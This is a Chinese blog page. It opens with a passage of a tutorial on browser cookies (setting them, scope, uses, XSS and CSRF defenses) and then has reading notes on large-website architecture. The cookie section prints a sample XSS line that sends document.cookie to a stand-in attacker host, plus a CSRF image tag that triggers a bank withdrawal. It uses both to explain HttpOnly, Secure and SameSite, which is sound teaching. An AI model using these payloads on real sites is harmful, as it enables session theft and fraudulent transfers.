向Cookie中添加新的Cookie Cookie为key=value形式</span></span><br><span class="line"><span class="comment">// 可设置path，domain，max-age，expires，secure</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 增加cookie</span></span><br><span class="line"><span class="built_in">document</span>.cookie = <span class="string">`someCookieName=true; expires=<span class="subst">$&#123;<span class="keyword">new</span> <span class="built_in">Date</span>().toGMTString() + <span class="number">1</span>&#125;</span>; path=/`</span></span><br><span class="line"><span class="comment">// 删除cookie 通过设置过去的时间删除cookie</span></span><br><span class="line"><span class="built_in">document</span>.cookie = <span class="string">`someCookieName=true; expires=<span class="subst">$&#123;<span class="keyword">new</span> <span class="built_in">Date</span>().toGMTString() - <span class="number">1</span>&#125;</span>; path=/`</span></span><br><span class="line"><span class="comment">// 修改cookie</span></span><br><span class="line"><span class="built_in">document</span>.cookie = <span class="string">`someCookieName=false; expires=<span class="subst">$&#123;<span class="keyword">new</span> <span class="built_in">Date</span>().toGMTString() + <span class="number">1</span>&#125;</span>; path=/`</span></span><br><span class="line"><span class="comment">// 查找cookie</span></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">"(?:^|;\\s*)"</span> + <span class="built_in">encodeURIComponent</span>(<span class="string">"需要查找的cookie"</span>).replace(<span class="regexp">/[-.+*]/g</span>, <span class="string">"\\$&amp;"</span>) + <span class="string">"\\s*\\="</span>)).test(<span class="built_in">document</span>.cookie)</span><br></pre></td></tr></table></figure></p>
<h3 id="后端通过http头设置"><a href="#后端通过http头设置" class="headerlink" title="后端通过http头设置"></a>后端通过http头设置</h3><p>后端可以通过设置cookie来设置传递的cookie。Nodejs操作cookie, Koa设置cookie<a href="https://github.com/pillarjs/cookies" target="_blank" rel="noopener">参数</a><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 以nodejs为例</span></span><br><span class="line"><span class="comment">// 获取</span></span><br><span class="line">response.getHeader(<span class="string">"Cookie"</span>);</span><br><span class="line"><span class="comment">// 设置</span></span><br><span class="line">response.setHeader(<span class="string">"Cookie"</span>, [<span class="string">"name=gdccwxx"</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 以koa为例</span></span><br><span class="line"><span class="comment">// 获取</span></span><br><span class="line">ctx.cookies.get(name, [options])</span><br><span class="line"><span class="comment">// 设置</span></span><br><span class="line">ctx.cookies.set(name, value, [options])</span><br></pre></td></tr></table></figure></p>
<h3 id="请求时通过http头传给后端"><a href="#请求时通过http头传给后端" class="headerlink" title="请求时通过http头传给后端"></a>请求时通过http头传给后端</h3><p>以Google键入请求为例</p>
<div style="width: 80%; margin: 0 auto;text-align:center"><img src="/HTTP/basic-cookies/./font-transfer-cookie.png" alt="请求Google">请求通过http头传送给后端</div>

<h3 id="遵守同源策略"><a href="#遵守同源策略" class="headerlink" title="遵守同源策略"></a>遵守同源策略</h3><p>Domain 和 Path 标识定义了cookie的作用域：即cookie应该发送给哪些URL。<br>Domain 标识指定了哪些主机可以接受cookie。如果不指定，默认为当前文档的主机（<strong>不包含子域名</strong>）。如果指定了Domain，则一般包含子域名。例如，如果设置 Domain=mozilla.org，则Cookie也包含在子域名中（如developer.mozilla.org）。</p>
<h2 id="Cookie作用及用途"><a href="#Cookie作用及用途" class="headerlink" title="Cookie作用及用途"></a>Cookie作用及用途</h2><h3 id="Cookie的作用"><a href="#Cookie的作用" class="headerlink" title="Cookie的作用"></a>Cookie的作用</h3><p><strong>存储个性化设置</strong><br>即使在相同的Domain下，不同的url可以存储不同区块下的cookie，即到达特定页面下可有页面自己的cookie。</p>
<div style="width: 80%; margin: 0 auto; text-align: center"><br>    <img src="/HTTP/basic-cookies/./out-path-cookie.png" alt="在主页的cookie"><br><br><br>  在google.com的cookie<br><br><br>  <img src="/HTTP/basic-cookies/./in-path-cookie.png" alt="在搜索的cookie"><br><br><br>  在google.com/search的cookie<br><br><br></div>

<p>正因为cookie的作用域，使得cookie存储有着多样性。</p>
<p><strong>存储未登陆时用户唯一标识</strong></p>
<p>在可允许未登陆的网站，例如新浪微博。游客态下所做的事情可与用户态下可进行关联。<br>具体操作：<br>1、向未登陆的用户发送一个唯一的标识。<br>2、保留唯一标识所做的事情。<br>3、用户登录后关联账户及唯一标识所做的事情。</p>
<p>以新浪微博为例：</p>
<div style="width: 80%; margin: 0 auto; text-align: center"><br><img src="/HTTP/basic-cookies/./unlogin-cookie.png" alt="未登陆状态下的cookie"><br><br><br>未登录状态下的cookie：login_sid_t表示唯一标识<br></div>

<p>通过唯一标识与登录态的绑定，可建立游客态与用户态的关联</p>
<p><strong>存储已经登陆用户的凭证</strong><br>cookie中存储用户的唯一标识及简单token。简单token是通过某种形式与用户唯一标识的加密后得出的结果。后端取到token及用户唯一标识，可以通过检查token判断合法性及是否登陆过期判断用户是否为登录态。</p>
<p><strong>存储其他业务数据</strong><br>可存储其他业务信息，例如用户生日等</p>
<h3 id="Cookie的用途"><a href="#Cookie的用途" class="headerlink" title="Cookie的用途"></a>Cookie的用途</h3><p>了解Cookie的作用后，其主要用途是以下三个方面：</p>
<ul>
<li>会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）</li>
<li>个性化设置（如用户自定义设置、主题等）</li>
<li>浏览器行为跟踪（如跟踪分析用户行为等）</li>
</ul>
<h2 id="Cookie-的安全策略"><a href="#Cookie-的安全策略" class="headerlink" title="Cookie 的安全策略"></a>Cookie 的安全策略</h2><h3 id="Cookie与XSS的关系"><a href="#Cookie与XSS的关系" class="headerlink" title="Cookie与XSS的关系"></a>Cookie与XSS的关系</h3><p>在http会话劫持情况下，cookie与xss的关系就显得十分亲密了。看一段代码<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">new</span> Image()).src = <span class="string">"http://www.evil-domain.com/steal-cookie.php?cookie="</span> + <span class="built_in">document</span>.cookie;</span><br></pre></td></tr></table></figure></p>
<p>这种情况下的cookie则会发送到攻击者的网站。</p>
<h4 id="分析XSS攻击："><a href="#分析XSS攻击：" class="headerlink" title="分析XSS攻击："></a>分析XSS攻击：</h4><ul>
<li>会话被劫持</li>
<li>通过document获取cookie</li>
</ul>
<h4 id="解决办法："><a href="#解决办法：" class="headerlink" title="解决办法："></a>解决办法：</h4><ul>
<li>会话劫持：使用cookie中Secure标识</li>
<li>不被JavaScript调用cookie：使用cookie中HttpOnly标识</li>
</ul>
<h4 id="参数介绍"><a href="#参数介绍" class="headerlink" title="参数介绍"></a>参数介绍</h4><p><strong>Secure（目前Chrome、Firefox在52+版本不允许非安全的HTTP设置Cookie）</strong></p>
<blockquote>
<p>一个带有安全属性的 cookie 只有在请求使用SSL和HTTPS协议的时候才会被发送到服务器。然而，保密或敏感信息永远不要在 HTTP cookie 中存储或传输，因为整个机制从本质上来说都是不安全的，比如前述协议并不意味着所有的信息都是经过加密的。</p>
</blockquote>
<p>用法：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set</span>-Cookie: name=gdccwxx; secure</span><br></pre></td></tr></table></figure>
<p><strong>HttpOnly</strong></p>
<blockquote>
<p>设置了 HttpOnly 属性的 cookie 不能使用 JavaScript 经由  <code>Document.cookie</code> 属性、<code>XMLHttpRequest</code> 和  <code>Request</code>APIs 进行访问，以防范跨站脚本攻击（XSS）。</p>
</blockquote>
<p>用法：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set</span>-Cookie: name=gdccwxx; HttpOnly</span><br></pre></td></tr></table></figure>
<h3 id="Cookie与CSRF的关系"><a href="#Cookie与CSRF的关系" class="headerlink" title="Cookie与CSRF的关系"></a>Cookie与CSRF的关系</h3><p>CSRF利用了用户的Cookie，通过第三方请求跨站进行攻击。<br>以下Wikipedia中的一个例子：在不安全聊天室或论坛上的一张图片，它实际上是一个给你银行服务器发送提现的请求：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://bank.example.com/withdraw?account=bob&amp;amount=1000000&amp;for=mallory"</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>这种情况会直接在本地load图片，图片地址指向的是银行。若本地打开过该银行相关信息，且cookie有效，则会直接被攻击者的账户提现。</p>
<h4 id="分析CSRF攻击"><a href="#分析CSRF攻击" class="headerlink" title="分析CSRF攻击"></a>分析CSRF攻击</h4><ul>
<li>被攻击者本地Cookie信息没有过期</li>
<li>银行转账系统无二次确认，直接转账</li>
<li>第三方网站（不安全的聊天室或论坛）加载请求</li>
<li>攻击者无法读写Cookie</li>
</ul>
<h4 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h4><ul>
<li>敏感信息过期时效缩短：目标网站对敏感Cookie设置较短的过期时间</li>
<li>增加二次确认：目标网站对敏感操作无二次确认</li>
<li>不允许第三方网站带cookie访问：检查访问请求referer来源，禁止第三方网站访问。</li>
<li>允许服务器要求某个cookie在跨站请求时不被发送：使用cookie中SameSite标识</li>
</ul>
<h4 id="参数介绍-1"><a href="#参数介绍-1" class="headerlink" title="参数介绍"></a>参数介绍</h4><p><strong>SameSite（目前兼容性不足，但不影响设置不支持该属性的浏览器）</strong></p>
<blockquote>
<p>允许服务器设定一则 cookie 不随着跨域请求一起发送，这样可以在一定程度上防范跨站请求伪造攻击（CSRF）。</p>
</blockquote>
<p>用法：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set</span>-Cookie: name=gdccwxx; SameSite <span class="comment">// default SameSite=Strict</span></span><br><span class="line"><span class="built_in">Set</span>-Cookie: name=gdccwxx; SameSite=Lax</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th style="text-align:left"><strong>请求类型</strong></th>
<th><strong>例子</strong></th>
<th><strong>非 SameSit</strong></th>
<th><strong>SameSite = Lax</strong></th>
<th><strong>SameSite = Strict</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">link</td>
<td>&lt;a href=”…”></td>
<td>Y</td>
<td>Y</td>
<td>N</td>
</tr>
<tr>
<td style="text-align:left">prerender</td>
<td>\&lt;link rel=”prerender” href=”…”></td>
<td>Y</td>
<td>Y</td>
<td>N</td>
</tr>
<tr>
<td style="text-align:left">form get</td>
<td>&lt;form method=”get” action=”…”></td>
<td>Y</td>
<td>Y</td>
<td>N</td>
</tr>
<tr>
<td style="text-align:left">form post</td>
<td>&lt;form method=”post” action=”…”></td>
<td>Y</td>
<td>N</td>
<td>N</td>
</tr>
<tr>
<td style="text-align:left">iframe</td>
<td>&lt;iframe src=”…”></td>
<td>Y</td>
<td>N</td>
<td>N</td>
</tr>
<tr>
<td style="text-align:left">ajax</td>
<td>$.get(‘…’)</td>
<td>Y</td>
<td>N</td>
<td>N</td>
</tr>
<tr>
<td style="text-align:left">image</td>
<td>&lt;img src=”…”></td>
<td>Y</td>
<td>N</td>
<td>N</td>
</tr>
</tbody>
</table>
<h2 id="要点总结："><a href="#要点总结：" class="headerlink" title="要点总结："></a>要点总结：</h2><ul>
<li><strong>Cookie是服务器保存在本地的数据块</strong></li>
<li><strong>每次请求都会包含cookie，因此会比较浪费资源</strong></li>
<li><strong>使用document.cookie可访问非HttpOnly的cookie</strong></li>
<li><strong>删除本地cookie只能通过给cookie设置过去的Expire删除</strong></li>
<li><strong>常用鉴别用户身份的方法是给cookie设置签名或token</strong></li>
<li><strong>为防止XSS、CSRF，应该尽量使用HttpOnly、Secure(https)、SameSite参数及检查referer</strong></li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.gdccwxx.com/随笔/《大型网站技术架》读书笔记/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="gdccwxx">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="gdccwxx">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/随笔/《大型网站技术架》读书笔记/" itemprop="url">《大型网站技术架》读书笔记</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-31T20:28:25+08:00">
                2019-03-31
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>拜读本书后，发现架构师一职所需要承担的职责不仅仅是那么简单，他肩负着一个网站的高可用、高并发等稳定职责。也让我受益匪浅，了解许多行内知识。</p>
<h3 id="大型网站系统特点"><a href="#大型网站系统特点" class="headerlink" title="大型网站系统特点"></a>大型网站系统特点</h3><ul>
<li>高并发、大流量</li>
<li>高可用</li>
<li>海量数据</li>
<li>用户分布广泛，网络情况复杂</li>
<li>安全环境恶劣</li>
<li>需求快速变更、发布频繁</li>
<li>渐进式发展</li>
</ul>
<h2 id="大型网站架构演化及发展历程"><a href="#大型网站架构演化及发展历程" class="headerlink" title="大型网站架构演化及发展历程"></a>大型网站架构演化及发展历程</h2><h5 id="初期网站"><a href="#初期网站" class="headerlink" title="初期网站"></a>初期网站</h5><p><img src="/随笔/《大型网站技术架》读书笔记/./websiteInit.jpeg" alt="初期应用服务器"></p>
<h5 id="最终架构的大型网站"><a href="#最终架构的大型网站" class="headerlink" title="最终架构的大型网站"></a>最终架构的大型网站</h5><p><img src="/随笔/《大型网站技术架》读书笔记/./websiteDisAppAndUseTec.jpeg" alt="业务及使用nosql"></p>
<h3 id="演化过程"><a href="#演化过程" class="headerlink" title="演化过程"></a>演化过程</h3><ul>
<li>应用服务器和数据服务器分离：应用有单独的应用服务器，数据有单独的数据服务器，文件有单独的文件服务器</li>
<li>添加缓存：增加本地缓存及分布式缓存，使得数据库查询的部分查询可以使用缓存查询</li>
<li>使用服务器集群：将单一服务器处理变成服务器集群处理，提升处理能力</li>
<li>数据库读写分离：主从数据库分别负责写、读功能，主数据库写入数据，主数据库服务器将数据写入从数据库</li>
<li>使用反向代理和CDN加速：CDN和反向代理的基本原理都是缓存，CDN可以使最近的机房提供给最近的用户，反向代理服务器若缓存过先前从中心机房给用户的数据，则将数据返回给用户</li>
<li>使用分布式文件管理系统及分布式数据库系统：分布式数据库及分布式文件是拆分网站最后不得已的手段，将不同业务存放在不同物理机上</li>
<li>使用NoSQL和搜索引擎：NoSQL和搜索引擎都是源自于互联网技术的手段，对于可伸缩的分布式特性有更好的支持</li>
<li>业务拆分：将不同业务分在不同产品线，每个应用独立部署</li>
<li>分布式服务：将不同服务的相同业务提取出来，将可复用的业务提供业务数据库连接及提供业务服务</li>
</ul>
<h3 id="网站架构误区"><a href="#网站架构误区" class="headerlink" title="网站架构误区"></a>网站架构误区</h3><ul>
<li>一味追求大公司解决方案：应针对自身业务提供解决方案，而非一味追求大公司解决方案</li>
<li>为了技术而技术：网站技术是为业务而存在的，除此之外毫无意义</li>
<li>企图用技术解决所有问题：技术是用来解决业务问题的，而业务问题也可以通过业务解决。例如12306，分时间抢票比同时间抢票更加技术上更容易实现，且系统更加稳定</li>
</ul>
<h2 id="大型网站架构模式"><a href="#大型网站架构模式" class="headerlink" title="大型网站架构模式"></a>大型网站架构模式</h2><h4 id="分层"><a href="#分层" class="headerlink" title="分层"></a>分层</h4><p><img src="/随笔/《大型网站技术架》读书笔记/./hierarchy.jpeg" alt="分层"></p>
<p>大型网站中架构也分层，将网站软件系统氛围应用层、服务层、数据层。</p>
<p>分层架构的目的：规划软件清晰的逻辑结构便于开发维护，但在网站的发展过程中，分层结构对网站支持高并发向分布式方向发展至关重要。因此应该在网站很小的时候采用分层架构</p>
<p>分层架构带来的挑战：必须合理规划层次边界和接口，在开发过程中，严格遵循分层架构的约束，禁止跨层次的调用（应用层直接调用数据层）及逆向调用（数据层调用服务层，或者服务层调用应用层）</p>
<h4 id="分割"><a href="#分割" class="headerlink" title="分割"></a>分割</h4><p>如果说分层是对软件的横向切割，那么分割是纵向切割</p>
<p>网站越大，功能越复杂，服务和数据处理的种类也越多，将这些不同的功能和服务分割开来，包装成高内聚低耦合的模块单元，一方面有助于软件的开发和维护；另一方面，便于不同模块的分布式部署，提高网站的并发处理能力和功能扩展能力。</p>
<p>大型网站分割的粒度可能会很小。比如在应用层，将不同业务进行分割，例如将购物、论坛、搜索、广告分割成不同的应用，由独立的团队负责，部署在不同的服务器上；在同一个应用内部，如果规模庞大业务复杂，会继续进行分割，比如购物业务，可以进一步分割成机票酒店业务、3C业务等</p>
<h4 id="分布式"><a href="#分布式" class="headerlink" title="分布式"></a>分布式</h4><ul>
<li>分布式应用和服务： 可以改善网站性能和并发性、加快开发和发布速度、减少数据库连接资源消耗外；还可以使不同应用复用共同的服务，便于业务功能扩展</li>
<li>分布式静态资源：网站的静态资源例如js、css、image等静态资源可以独立分布部署，并采用独立资源。可以减轻应用服务器压力</li>
<li>分布式数据及存储：单台机器无法提供海量存储</li>
<li>分布式计算：目前网站大部分使用Hadoop及其MapReduce分布式计算框架使用处理计算。</li>
<li>分布式配置，分布式锁，分布式文件等</li>
</ul>
<h4 id="集群"><a href="#集群" class="headerlink" title="集群"></a>集群</h4><p>多台服务器可成一个集群，通过负载均衡对外提供服务，通过负载均衡新增或更替机器</p>
<h4 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h4><p>缓存就是将数据存放在距离计算最近的位置以加快处理速度。缓存是改善软件性能的第一手段</p>
<ul>
<li>CDN：可以缓存一些较少变化数据，如视频文件等，可以就近迅速返还给用户</li>
<li>反向代理：当用户请求到达中心时，最先访问反向代理服务器，这里缓存的是静态资源，无需转应用服务器就可返回给用户</li>
<li>本地缓存：缓存着热点数据，无需访问数据库直接可以取到，相比缓存服务器更迅速</li>
<li>分布式缓存：网站数据十分庞大时，本地缓存无法解决问题。</li>
</ul>
<p>使用缓存有两个前提条件，一是数据访问热点不均衡，某些数据会被更频繁的访问，这些数据应该放在缓存中；二是数据在某个时间段内有效，不会很快过期，否则缓存的数据就会因已经失效而产生脏读，影响结果的正确性</p>
<h4 id="异步"><a href="#异步" class="headerlink" title="异步"></a>异步</h4><ul>
<li>提高系统可用性：消费者服务器发生故障，数据会在消息队列服务器中存储堆积，生产者服务器可以继续处理业务请求，系统整体表现无故障</li>
<li>加快网站响应速度：处理完业务数据请求后，不需要等待消费者服务器处理就可以返回，直接写入消息队列，响应延迟减少</li>
<li>消除并发高峰：将请求放入消息队列中依次处理，就不对对整个网站负载造成过大压力</li>
</ul>
<h4 id="冗余"><a href="#冗余" class="headerlink" title="冗余"></a>冗余</h4><p>网站应该实现数据的冷备份外，还有热备份。即定时保存和实时保存数据，以及灾备数据中心。避免由于单个服务器损坏后数据损坏。</p>
<h4 id="自动化"><a href="#自动化" class="headerlink" title="自动化"></a>自动化</h4><p>网站发布应该具备以下环节</p>
<ul>
<li>发布自动化</li>
<li>代码管理：版本控制</li>
<li>自动化测试：自动检测并发送检测报告</li>
<li>自动化安全检测：对代码进行静态安全扫描部署及攻击测试</li>
<li>自动化部署：自动部署到生产环境</li>
<li>自动化监控：监控服务器宕机，程序bug，存储空间不足，突然访问高峰</li>
<li>自动化报警：超出阈值发送邮件报警</li>
<li>自动化失效转移：将失效的服务器从集群隔离</li>
<li>自动化失效恢复：重新启动服务</li>
<li>自动化降级：访问高峰则关闭次要服务</li>
<li>自动化分配资源：将空闲资源合理分配给重要任务</li>
</ul>
<h4 id="安全"><a href="#安全" class="headerlink" title="安全"></a>安全</h4><ul>
<li>密码和手机校验</li>
<li>通信加密</li>
<li>验证码识别</li>
<li>敏感词汇过滤</li>
<li>风险信息控制</li>
</ul>
<h2 id="架构要素"><a href="#架构要素" class="headerlink" title="架构要素"></a>架构要素</h2><p>通俗说法：最高层次的规划，难以改变的决定</p>
<p>一般说来，除了当前的系统功能需求外，软件架构还需要关注性能、可用性、伸缩性、扩展性和安全性这5个架构要素</p>
<ul>
<li>性能：衡量网站性能有一系列指标，重要的有响应时间、TPS、系统性能计数器等</li>
<li>可用性：大型网站至少到99.99%，衡量一个系统架构设计是否满足高可用的目标，就是假设系统中任何一台或者多台服务器宕机时，以及出现各种不可预期的问题时，系统整体是否依然可用</li>
<li>伸缩性：衡量架构伸缩性的主要标准就是是否可以用多台服务器构建集群，是否容易向集群中添加新的服务器。加入新的服务器后是否可以提供和原来的服务器无差别的服务。集群中可容纳的总的服务器数量是否有限制</li>
<li>扩展性：衡量网站架构扩展性好坏的主要标准就是在网站增加新的业务产品时，是否可以实现对现有产品透明无影响，不需要任何改动或者很少改动既有业务功能就可以上线新产品</li>
<li>安全性：衡量网站安全架构的标准就是针对现存和潜在的各种攻击与窃密手段，是否有可靠的应对策略</li>
</ul>
<h2 id="网站的高性能架构"><a href="#网站的高性能架构" class="headerlink" title="网站的高性能架构"></a>网站的高性能架构</h2><h4 id="不同视角下的性能"><a href="#不同视角下的性能" class="headerlink" title="不同视角下的性能"></a>不同视角下的性能</h4><ul>
<li>用户视角的网站性能：从用户角度，网站性能就是用户在浏览器上直观感受到的网站响应速度快还是慢。用户感受到的时间，包括用户计算机和网站服务器通信的时间、网站服务器处理的时间、用户计算机浏览器构造请求解析响应数据的时间</li>
<li>开发人员角度的网站性能：是应用程序本身及其相关子系统的性能，包括响应延迟、系统吞吐量、并发处理能力、系统稳定性等技术指标。主要的优化手段有使用缓存加速数据读取，使用集群提高吞吐能力，使用异步消息加快请求响应及实现削峰，使用代码优化手段改善程序性能</li>
<li>运维角度的网站性能：关注基础设施性能和资源利用率，如网络运营商的带宽能力、服务器硬件的配置、数据中心网络架构、服务器和网络带宽的资源利用率等。主要优化手段有建设优化骨干网、使用高性价比定制服务器、利用虚拟化技术优化资源利用等</li>
</ul>
<h4 id="性能优化策略"><a href="#性能优化策略" class="headerlink" title="性能优化策略"></a>性能优化策略</h4><ul>
<li>性能分析：检查请求处理的各个环节的日志，分析哪个环节响应时间不合理、超过预期；然后检查监控数据，分析影响性能的主要因素是内存、磁盘、网络、还是CPU，是代码问题还是架构设计不合理</li>
<li>性能优化：根据分层架构可分为web前端优化、应用服务器性能优化、存储服务器性能优化</li>
</ul>
<h4 id="前端优化策略"><a href="#前端优化策略" class="headerlink" title="前端优化策略"></a>前端优化策略</h4><ul>
<li>减少http请求</li>
<li>使用浏览器缓存</li>
<li>启动压缩</li>
<li>css放在最上面，js放在页面最下面</li>
<li>减少cookie传输</li>
</ul>
<h4 id="CDN加速"><a href="#CDN加速" class="headerlink" title="CDN加速"></a>CDN加速</h4><p>CDN能够缓存的一般是静态资源，如图片、文件、CSS、Script脚本、静态网页等，但是这些文件访问频度很高，将其缓存在CDN可极大改善网页的打开速度</p>
<h4 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h4><p>传统代理服务器位于浏览器一侧，代理浏览器将HTTP请求发送到互联网上，而反向代理服务器位于网站机房一侧，代理网站Web服务器接收HTTP请求</p>
<h4 id="缓存-1"><a href="#缓存-1" class="headerlink" title="缓存"></a>缓存</h4><ul>
<li>基本原理： K-V形式存储</li>
<li>合理使用缓存：数据读写比2:1以上使用缓存才有意义</li>
<li>数据不一致与脏读：需要设置缓存时间，在缓存时间内可接受脏读</li>
<li>缓存可用性：数据库在面临缓存失效时容易出现访问过大导致宕机</li>
<li>缓存预热：提前加载缓存保证缓存可用</li>
<li>缓存穿透：将value为null的情况也加载在缓存中</li>
</ul>
<h4 id="代码优化"><a href="#代码优化" class="headerlink" title="代码优化"></a>代码优化</h4><ul>
<li>多线程：使用多线程处理IO与多cpu一般算法：多线程数=[任务执行时间/(任务执行时间-IO等待时间)]* cpu内核数量</li>
<li>将对象设计成无状态：在多并发时对象不会因多线程导致状态改变</li>
<li>使用局部对象：在方法内创建对象</li>
<li>并发访问使用锁：锁将并发操作转化为顺序操作</li>
<li>资源复用：使用单例模式和对象池</li>
<li>数据结构：使用数据结构+算法的形式优化代码可以极大的优化性能</li>
<li>垃圾回收：垃圾回收机制有利于性能提升</li>
</ul>
<h2 id="网站高可用架构"><a href="#网站高可用架构" class="headerlink" title="网站高可用架构"></a>网站高可用架构</h2><h4 id="网站高可用性度量"><a href="#网站高可用性度量" class="headerlink" title="网站高可用性度量"></a>网站高可用性度量</h4><p>网站不可用时间（故障时间）=故障修复时间点-故障发现（报告）时间点</p>
<p>网站年度可用性指标=（1-网站不可用时间/年度总时间）×100%</p>
<p>对于大多数网站而言，2个9是基本可用，网站年度不可用时间小于88小时；3个9是较高可用，网站年度不可用时间小于9小时；4个9是具有自动恢复能力的高可用，网站年度不可用时间小于53分钟；5个9是极高可用性，网站年度不可用时间小于5分钟。</p>
<h4 id="网站可用性考核"><a href="#网站可用性考核" class="headerlink" title="网站可用性考核"></a>网站可用性考核</h4><p><img src="/随笔/《大型网站技术架》读书笔记/./useWeight.jpeg" alt></p>
<p>故障分=故障时间（分钟）× 故障权重</p>
<h4 id="高可用的服务"><a href="#高可用的服务" class="headerlink" title="高可用的服务"></a>高可用的服务</h4><ul>
<li>服务器分级：将服务器分不同级别，核心应用和服务优先使用更好的服务器</li>
<li>超时设置：由于宕机或死锁等其他情况，超时后可设置调度到其他服务器</li>
<li>异步调用：异步调用减少服务器压力</li>
<li>服务降级：高峰期使用服务器降级，拒绝服务（拒绝部分请求）或关闭服务（关闭非核心服务）</li>
<li>幂等性设计：服务层必须保证多次调用和一次调用结果一致</li>
</ul>
<h4 id="数据可用性"><a href="#数据可用性" class="headerlink" title="数据可用性"></a>数据可用性</h4><ul>
<li>数据持久性： 多个副本，在某个存储出错后数据不会丢失</li>
<li>数据可访问性：切换数据源时用户无感知</li>
<li>数据一致性：不同副本保证数据一致</li>
</ul>
<h4 id="网站运行监控"><a href="#网站运行监控" class="headerlink" title="网站运行监控"></a>网站运行监控</h4><p>不允许没有监控的系统上线</p>
<ul>
<li>用户行为日志收集</li>
<li>服务器端日志收集</li>
<li>客户端浏览器日志收集</li>
<li>服务器性能监控</li>
<li>运行数据报告</li>
</ul>
<h5 id="小结：网站的基本架构及优化方式，是一直以来我比较模糊的地方。这本书通过透彻的解析，让我更加深刻的明白网站的架构技术。对于负载均衡我认为是比较重要的一部分。应该自成章节，反复验证。"><a href="#小结：网站的基本架构及优化方式，是一直以来我比较模糊的地方。这本书通过透彻的解析，让我更加深刻的明白网站的架构技术。对于负载均衡我认为是比较重要的一部分。应该自成章节，反复验证。" class="headerlink" title="小结：网站的基本架构及优化方式，是一直以来我比较模糊的地方。这本书通过透彻的解析，让我更加深刻的明白网站的架构技术。对于负载均衡我认为是比较重要的一部分。应该自成章节，反复验证。"></a>小结：网站的基本架构及优化方式，是一直以来我比较模糊的地方。这本书通过透彻的解析，让我更加深刻的明白网站的架构技术。对于负载均衡我认为是比较重要的一部分。应该自成章节，反复验证。</h5>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">gdccwxx</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">31</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">14</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/gdccwxx" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="mailto:765553928@qq.com" target="_blank" title="E-Mail">
                      
                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                  </span>
                
            </div>
          

          
          

          
